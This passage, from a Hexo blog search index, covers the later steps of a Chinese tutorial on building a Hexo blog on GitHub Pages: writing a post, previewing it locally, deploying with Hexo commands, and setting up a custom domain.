--save</code> 安装插件，然后在执行上一步命令第一次部署应该会让登录，浏览yourname.github.io成功显示博客页</p><h2 id="四、写作并上传第一篇博客"><a href="#四、写作并上传第一篇博客" class="headerlink" title="四、写作并上传第一篇博客"></a>四、写作并上传第一篇博客</h2><h3 id="1-写作"><a href="#1-写作" class="headerlink" title="1. 写作"></a>1. 写作</h3><pre class="line-numbers language-none"><code class="language-none">hexo new [layout] &lt;title&gt;  #创建新文章<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/7.png"></p></div>创建后会在本地目录生成测试.md文件，用markdown语法编辑文件后保存，建议每次写作后本地部署完成进入http://localhost:4000 查看无误后再上传。<pre class="line-numbers language-none"><code class="language-none">hexo server    # 本地服务部署  可简写为hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-上传"><a href="#2-上传" class="headerlink" title="2. 上传"></a>2. 上传</h3><p>依次执行命令，hexo的具体用法请查看官方文档 <a href="https://hexo.io/zh-cn/docs/">戳这里</a></p><pre class="line-numbers language-none"><code class="language-none">hexo clean    # 清除缓存hexo generate   # 生成静态页面  可简写为hexo ghexo deploy   # 部署博客  可简写为hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="五、解析私人域名"><a href="#五、解析私人域名" class="headerlink" title="五、解析私人域名"></a>五、解析私人域名</h2><p>这里就要买域名了，我这里是在腾讯买的，如图添加两条记录</p><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/8.png"></p></div><p>然后在本地博客目录下的source文件夹下新建名为CNAME的文件，其中写入域名</p><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/9.png"></p></div><p>最后在github库中的setting中的Custom domain下填写购买的域名,save保存。</p><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/10.png"></p></div><p>好了，域名配置完成。</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
